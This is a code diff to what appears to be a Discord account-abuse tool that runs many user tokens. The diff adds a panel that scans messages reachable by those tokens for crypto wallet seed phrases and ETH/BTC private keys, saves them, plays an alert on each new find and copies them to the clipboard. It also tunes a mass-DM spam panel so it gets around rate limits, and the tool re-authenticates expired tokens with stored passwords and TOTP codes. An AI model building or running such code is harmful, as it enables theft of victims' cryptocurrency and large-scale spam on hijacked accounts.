@@ -514,10 +514,110 @@ def _play_ding():
             pass
 
 
+# ── Loud alert for findings (seed phrases / keys) ──
+FINDING_WAV = os.path.join(os.path.dirname(os.path.abspath(__file__)), '_finding_alert.wav')
+
+def _generate_finding_wav():
+    """Generate a loud, unmistakable 3-tone alert for crypto findings."""
+    if os.path.exists(FINDING_WAV):
+        return
+    sr = 44100
+    data = b''
+    # Three ascending tones: C6 → E6 → G6, loud and sharp
+    tones = [(1046.5, 0.25), (1318.5, 0.25), (1568.0, 0.4)]
+    for freq, dur in tones:
+        n = int(sr * dur)
+        for i in range(n):
+            t = i / sr
+            envelope = min(1.0, 4 * t) * max(0, 1 - t / dur * 0.3) * 0.95
+            sample = envelope * math.sin(2 * math.pi * freq * t)
+            sample += envelope * 0.4 * math.sin(2 * math.pi * freq * 2 * t)  # harmonic
+            sample += envelope * 0.2 * math.sin(2 * math.pi * freq * 3 * t)  # extra bite
+            sample = max(-1, min(1, sample))
+            data += struct.pack('<h', int(sample * 32500))
+    with wave.open(FINDING_WAV, 'w') as w:
+        w.setnchannels(1)
+        w.setsampwidth(2)
+        w.setframerate(sr)
+        w.writeframes(data)
+
+try:
+    _generate_finding_wav()
+except:
+    pass
+
+def _play_finding_alert():
+    """Play a loud 3-tone alert for new crypto findings."""
+    try:
+        winsound.PlaySound(FINDING_WAV, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_NODEFAULT)
+    except:
+        try:
+            # Fallback: system exclamation beep
+            winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
+        except:
+            pass
+
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  Seed Phrase / Private Key Scanner
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 IMPORTANT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'important.txt')
+
+# Global de-duplicated findings store: set of (type, content, source) tuples
+_findings_store = []   # list of dicts: {type, content, source, ts}
+_findings_seen = set() # set of (type, content) for dedup
+_findings_lock = threading.Lock()
+
+def _add_finding(entry_type, content, source=''):
+    """Add a finding to the global store (deduplicated by type+content)."""
+    key = (entry_type, content.strip())
+    with _findings_lock:
+        if key in _findings_seen:
+            return False
+        _findings_seen.add(key)
+        _findings_store.append({
+            'type': entry_type,
+            'content': content.strip(),
+            'source': source,
+            'ts': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        })
+    return True
+
+def _load_findings_from_file():
+    """Seed the findings store from important.txt (called once at startup)."""
+    if not os.path.exists(IMPORTANT_FILE):
+        return
+    try:
+        with open(IMPORTANT_FILE, 'r', encoding='utf-8') as f:
+            text = f.read()
+        # Parse blocks separated by ====
+        blocks = text.split('=' * 60)
+        for block in blocks:
+            block = block.strip()
+            if not block:
+                continue
+            lines = block.strip().split('\n')
+            if len(lines) < 2:
+                continue
+            # First line: [timestamp] [TYPE] Source: ...
+            header = lines[0]
+            content = '\n'.join(lines[1:]).strip()
+            entry_type = ''
+            source = ''
+            import re as _re
+            m = _re.search(r'\[([A-Z_]+)\]', header)
+            if m:
+                entry_type = m.group(1)
+            sm = _re.search(r'Source:\s*(.+)', header)
+            if sm:
+                source = sm.group(1).strip()
+            if entry_type and content:
+                _add_finding(entry_type, content, source)
+    except Exception as e:
+        print(f'[findings] Error loading important.txt: {e}')
+
+# Load existing findings at import time
+_load_findings_from_file()
 
 _BIP39_COMMON = {
     'abandon','ability','able','about','above','absent','absorb','abstract','absurd','abuse',
@@ -745,11 +845,18 @@ def _is_private_key(text):
 
 
 def _save_important(entry_type, content, source=''):
+    is_new = _add_finding(entry_type, content, source)
     try:
         ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         with open(IMPORTANT_FILE, 'a', encoding='utf-8') as f:
             f.write(f'\n[{ts}] [{entry_type}] Source: {source}\n{content}\n{"="*60}\n')
-        print(f'[!!! IMPORTANT] Saved {entry_type} to important.txt from {source}')
+        if is_new:
+            print(f'[!!! IMPORTANT] NEW {entry_type} from {source}')
+            # LOUD ALERT for new finding
+            try: _play_finding_alert()
+            except: pass
+        else:
+            print(f'[important] Duplicate {entry_type} (already known)')
     except Exception as e:
         print(f'[important] Save error: {e}')
 
@@ -1589,8 +1696,8 @@ class MassDMPanel(ActionPanel):
             elif code == 429:
                 retry = r.json().get('retry_after', 5)
                 self.inc_stat('ratelimit')
-                if retry > 30:
-                    self.log(f"  🚫 {label} rate-limited {retry:.0f}s — skip token", 'red')
+                if retry > 120:
+                    self.log(f"  🚫 {label} rate-limited {retry:.0f}s — skip guild", 'red')
                     return 'ratelimit_skip'
                 self.log(f"  ⏳ {label} rate-limited {retry:.1f}s", 'yellow')
                 time.sleep(retry + 0.3)
@@ -1628,6 +1735,8 @@ class MassDMPanel(ActionPanel):
 
     def _worker(self, message, guild_delay, dm_delay, threads):
         self.log(f"Starting Mass Blast · {len(self.active_tokens)} tokens · {threads} concurrent · guild {guild_delay}s · DM {dm_delay}s", 'accent')
+        import time as _time
+        _t0 = _time.time()
 
         def _run_token(i, t):
             if self.stopped: return
@@ -1658,8 +1767,8 @@ class MassDMPanel(ActionPanel):
                             token_dead = True
                             self.inc_stat('dead'); break
                         elif result == 'ratelimit_skip':
-                            token_dead = True
-                            self.log(f"  [{uname}] 🚫 DM rate-limited hard — sent {dm_sent}/{len(dm_channels)}", 'yellow')
+                            self.log(f"  [{uname}] 🚫 DM rate-limited hard — sent {dm_sent}/{len(dm_channels)}, cooling 15s then guilds", 'yellow')
+                            time.sleep(15)
                             break
                         elif result != 'noperms':
                             self.inc_stat('failed')
@@ -1730,38 +1839,66 @@ class MassDMPanel(ActionPanel):
             total_ch = sum(len(chs) for _, chs in work)
             self.log(f"  [{uname}] 📋 {total_ch} sendable channels across {len(work)} guilds", 'dim')
 
-            # Send to all guilds — try every channel (no skip on no-perms)
-            for gname, sendable in work:
+            # Send to all guilds — try every channel
+            total_sent = 0
+            total_noperms = 0
+            total_attempted = 0
+            for gi, (gname, sendable) in enumerate(work, 1):
                 if self.stopped or token_dead: break
+                g_sent = 0
+                g_noperms = 0
+                g_fail = 0
+                skip_guild = False
                 for ch_id, ch_name_raw in sendable:
-                    if self.stopped or token_dead: break
+                    if self.stopped or token_dead or skip_guild: break
+                    total_attempted += 1
                     ch_label = f"#{ch_name_raw} ({gname})"
                     result = self._send_msg(t.token, ch_id, guild_msg, ch_label)
                     if result == 'ok':
-                        self.inc_stat('guild_sent')
+                        self.inc_stat('guild_sent'); g_sent += 1; total_sent += 1
+                        time.sleep(guild_delay)
                     elif result == 'dead':
                         token_dead = True
                         self.inc_stat('dead'); break
                     elif result == 'ratelimit_skip':
-                        token_dead = True; break
+                        # Don't kill the whole token — just skip this guild, cooldown, try next
+                        self.log(f"  [{uname}] ⏭ Rate-limited hard in {gname} — skipping guild, cooling 15s", 'yellow')
+                        skip_guild = True
+                        time.sleep(15)
                     elif result == 'noperms':
-                        pass  # Skip silently, try next channel
+                        g_noperms += 1; total_noperms += 1
+                        # NO sleep on 403 — skip instantly to next channel
                     else:
-                        self.inc_stat('failed')
-                    time.sleep(guild_delay)
+                        self.inc_stat('failed'); g_fail += 1
+                        time.sleep(guild_delay)
+                # Per-guild summary
+                parts = []
+                if g_sent: parts.append(f"{g_sent} sent")
+                if g_noperms: parts.append(f"{g_noperms} no-perms")
+                if g_fail: parts.append(f"{g_fail} fail")
+                summary = ", ".join(parts) if parts else "nothing"
+                if g_sent > 0:
+                    self.log(f"  [{uname}] 📊 Guild {gi}/{len(work)} {gname}: {summary} ({len(sendable)} ch)", 'green')
+                else:
+                    self.log(f"  [{uname}] 📊 Guild {gi}/{len(work)} {gname}: {summary} ({len(sendable)} ch)", 'dim')
 
+            self.log(f"  [{uname}] ✅ Guild phase done: {total_sent} sent, {total_noperms} no-perms, {total_attempted} attempted", 'cyan')
             self.inc_stat('tokens_done')
 
         # Run N tokens concurrently
-        with ThreadPoolExecutor(max_workers=threads) as pool:
-            futures = [pool.submit(_run_token, i, t) for i, t in enumerate(self.active_tokens)]
-            for f in as_completed(futures):
-                if self.stopped: break
-                try: f.result()
-                except Exception as e: self.log(f"Thread error: {e}", 'red')
+        try:
+            with ThreadPoolExecutor(max_workers=threads) as pool:
+                futures = [pool.submit(_run_token, i, t) for i, t in enumerate(self.active_tokens)]
+                for f in as_completed(futures):
+                    if self.stopped: break
+                    try: f.result()
+                    except Exception as e: self.log(f"Thread error: {e}", 'red')
+        except Exception as e:
+            self.log(f"Pool error: {e}", 'red')
 
+        elapsed = _time.time() - _t0
         s = self._stats
-        self.log(f"═══ Done · {s['guild_sent']} guild · {s['dm_sent']} DMs · {s['failed']} fail · {s.get('dead',0)} dead · {s['ratelimit']} rl ═══", 'accent')
+        self.log(f"═══ Done in {elapsed:.0f}s · {s['guild_sent']} guild · {s['dm_sent']} DMs · {s['failed']} fail · {s.get('dead',0)} dead · {s['ratelimit']} rl ═══", 'accent')
         self.finish()
 
 
@@ -2774,6 +2911,130 @@ def _reauth_token(t: 'TokenInfo'):
     raise ValueError('MFA required but TOTP and all backup codes failed')
 
 
+class FindingsPanel(ActionPanel):
+    """Display all unique seed phrases & private keys found by the scanner."""
+    def __init__(self, parent, tokens):
+        super().__init__(parent, "🔑 Findings", "Seed phrases & private keys found (no duplicates)", width=800, height=620)
+        self._panel_key = 'findings'
+        self._hub = parent
+        self.tokens = tokens  # not used, but required by ActionPanel interface
+        self._item_frames = []
+
+        pad = self.config_frame
+        info_row = ctk.CTkFrame(pad, fg_color="transparent"); info_row.pack(fill="x", padx=16, pady=(10, 4))
+        with _findings_lock:
+            count = len(_findings_store)
+            seeds = sum(1 for f in _findings_store if f['type'] == 'SEED_PHRASE')
+            eth = sum(1 for f in _findings_store if f['type'] == 'ETH_PRIVATE_KEY')
+            btc = sum(1 for f in _findings_store if f['type'] == 'BTC_WIF_KEY')
+        self._count_label = ctk.CTkLabel(info_row,
+            text=f"🔑 {count} unique findings  ·  {seeds} seeds  ·  {eth} ETH keys  ·  {btc} BTC keys",
+            font=_F(FONT, 13, "bold"), text_color=C['green'] if count else C['text_muted'])
+        self._count_label.pack(side="left")
+
+        btn_row = ctk.CTkFrame(pad, fg_color="transparent"); btn_row.pack(fill="x", padx=16, pady=(2, 8))
+        ctk.CTkButton(btn_row, text="📋 Copy All", width=90, height=28, corner_radius=7,
+                      fg_color=C['accent'], hover_color=C['accent_hover'],
+                      font=_F(FONT, 11, "bold"), command=self._copy_all).pack(side="left", padx=(0, 6))
+        ctk.CTkButton(btn_row, text="🔄 Refresh", width=80, height=28, corner_radius=7,
+                      fg_color=C['surface_2'], hover_color=C['card_hover'],
+                      font=_F(FONT, 11, "bold"), command=self._refresh_list).pack(side="left", padx=6)
+        ctk.CTkButton(btn_row, text="📋 Copy Seeds", width=100, height=28, corner_radius=7,
+                      fg_color=C['surface_2'], hover_color=C['card_hover'],
+                      font=_F(FONT, 11, "bold"), command=lambda: self._copy_type('SEED_PHRASE')).pack(side="left", padx=6)
+        ctk.CTkButton(btn_row, text="📋 Copy Keys", width=100, height=28, corner_radius=7,
+                      fg_color=C['surface_2'], hover_color=C['card_hover'],
+                      font=_F(FONT, 11, "bold"), command=lambda: self._copy_type('ETH_PRIVATE_KEY', 'BTC_WIF_KEY')).pack(side="left", padx=6)
+
+        # Override the console area with a scrollable findings list
+        # The console is already built by ActionPanel, so we just populate it
+        self._refresh_list()
+
+    def on_start(self):
+        """Re-scan all tokens for secrets."""
+        if not self.tokens:
+            self.log("No tokens to scan", 'red'); self.finish(); return
+        threading.Thread(target=self._worker, daemon=True).start()
+
+    def _worker(self):
+        valid = [t for t in self.tokens if t.valid is True]
+        self.log(f"🔍 Scanning {len(valid)} tokens for secrets...", 'accent')
+        for i, t in enumerate(valid):
+            if self.stopped: break
+            uname = t.display_name or t.username or t.token[:12]
+            self.log(f"  [{i+1}/{len(valid)}] Scanning {uname}...", 'dim')
+            try:
+                _scan_token_messages(t)
+            except Exception as e:
+                self.log(f"  ✗ {uname}: {e}", 'red')
+            time.sleep(0.3)
+        with _findings_lock:
+            count = len(_findings_store)
+        self.log(f"═══ Done · {count} total unique findings ═══", 'accent')
+        self.after(100, self._refresh_list)
+        self.finish()
+
+    def _refresh_list(self):
+        """Redraw findings in console."""
+        with _findings_lock:
+            items = list(_findings_store)
+            seeds = sum(1 for f in items if f['type'] == 'SEED_PHRASE')
+            eth = sum(1 for f in items if f['type'] == 'ETH_PRIVATE_KEY')
+            btc = sum(1 for f in items if f['type'] == 'BTC_WIF_KEY')
+        try:
+            self._count_label.configure(
+                text=f"🔑 {len(items)} unique findings  ·  {seeds} seeds  ·  {eth} ETH keys  ·  {btc} BTC keys",
+                text_color=C['green'] if items else C['text_muted'])
+        except: pass
+        # Clear console and re-render
+        try:
+            self.console.configure(state='normal')
+            self.console.delete('1.0', 'end')
+            if not items:
+                self.console.insert('end', 'No findings yet. Press ▶ Start to scan all tokens.\n', 'dim')
+            else:
+                type_icons = {'SEED_PHRASE': '🌱', 'ETH_PRIVATE_KEY': '⟠', 'BTC_WIF_KEY': '₿'}
+                type_colors = {'SEED_PHRASE': 'green', 'ETH_PRIVATE_KEY': 'cyan', 'BTC_WIF_KEY': 'yellow'}
+                for i, f in enumerate(items, 1):
+                    icon = type_icons.get(f['type'], '🔑')
+                    color = type_colors.get(f['type'], 'white')
+                    self.console.insert('end', f'\n{icon} ', color)
+                    self.console.insert('end', f'[{f["type"]}]', color)
+                    self.console.insert('end', f'  ({f["source"]})\n' if f['source'] else '\n', 'dim')
+                    self.console.insert('end', f'  {f["content"]}\n', 'white')
+                    self.console.insert('end', f'  Found: {f["ts"]}\n', 'dim')
+                    self.console.insert('end', '  ' + '─' * 60 + '\n', 'dim')
+            self.console.see('1.0')
+            self.console.configure(state='disabled')
+        except: pass
+
+    def _copy_all(self):
+        with _findings_lock:
+            items = list(_findings_store)
+        if not items:
+            self.log("Nothing to copy", 'yellow'); return
+        lines = []
+        for f in items:
+            lines.append(f'[{f["type"]}] {f["content"]}')
+        try:
+            self.clipboard_clear()
+            self.clipboard_append('\n'.join(lines))
+            self.log(f"📋 Copied {len(items)} findings to clipboard", 'green')
+        except: pass
+
+    def _copy_type(self, *types):
+        with _findings_lock:
+            items = [f for f in _findings_store if f['type'] in types]
+        if not items:
+            self.log(f"No {'/'.join(types)} findings to copy", 'yellow'); return
+        lines = [f['content'] for f in items]
+        try:
+            self.clipboard_clear()
+            self.clipboard_append('\n'.join(lines))
+            self.log(f"📋 Copied {len(items)} {types[0]} entries", 'green')
+        except: pass
+
+
 class ExpiredTokensPanel(ActionPanel):
     """Re-authenticate expired/locked tokens using stored email + password + TOTP/backup codes."""
     def __init__(self, parent, tokens):
@@ -3049,6 +3310,9 @@ class DataHub(ctk.CTk):
         self._panel_buttons['bio'].pack(side="left", padx=3)
         self._panel_buttons['display_name'] = ctk.CTkButton(row2, text="🏷️ Names", width=78, command=lambda: self._toggle_panel('display_name'), **sc, **bs)
         self._panel_buttons['display_name'].pack(side="left", padx=3)
+        self._panel_buttons['findings'] = ctk.CTkButton(row2, text="🔑 Findings", width=85, command=lambda: self._toggle_panel('findings'),
+                                                        fg_color='#f59e0b', hover_color='#d97706', **bs)
+        self._panel_buttons['findings'].pack(side="left", padx=3)
         self._panel_buttons['expired'] = ctk.CTkButton(row2, text="🔄 Expired", width=80, command=lambda: self._toggle_panel('expired'),
                                                        fg_color='#dc2626', hover_color='#b91c1c', **bs)
         self._panel_buttons['expired'].pack(side="left", padx=3)
@@ -3096,7 +3360,8 @@ class DataHub(ctk.CTk):
             'friend_bomb': FriendBombPanel, 'status': StatusChangerPanel,
             'nick': NickChangerPanel, 'hypesquad': HypeSquadPanel,
             'leave_guild': LeaveGuildPanel, 'bio': BioChangerPanel,
-            'display_name': DisplayNamePanel, 'expired': ExpiredTokensPanel,
+            'display_name': DisplayNamePanel, 'findings': FindingsPanel,
+            'expired': ExpiredTokensPanel,
         }
         cls = panel_classes.get(key)
         if cls:
